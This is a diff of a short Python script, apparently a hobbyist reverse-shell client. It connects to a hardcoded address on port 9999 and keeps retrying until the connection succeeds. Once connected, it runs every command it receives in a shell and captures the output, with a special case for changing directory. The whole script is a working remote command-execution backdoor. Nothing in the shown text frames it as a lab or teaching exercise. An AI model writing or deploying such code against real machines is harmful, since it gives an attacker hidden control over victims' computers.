@@ -2,22 +2,36 @@ import socket
 import subprocess
 import os
 
+#############################################################
+############################################################
 
+
+############################################################
+#########################################################
 
 s = socket.socket()
+global host 
+global port
+
 host = '192.168.56.1'
 port = 9999
 
-s.connect((host,port))
+def connecting():
+    try:
+        s.connect((host,port))
+    except:
+        #print("Error in connecting to server")
+        connecting()
 
-
+connecting()
 
 while True:
     data = s.recv(2048)
     if data[:2].decode("utf-8") == "cd":
         os.chdir(data[3:].decode("utf-8"))
         
-    if len(data)>0:
+    if len(data)>0: 
+    
         cmd = subprocess.Popen(data.decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
 
         output_byte = cmd.stdout.read() +cmd.stderr.read()
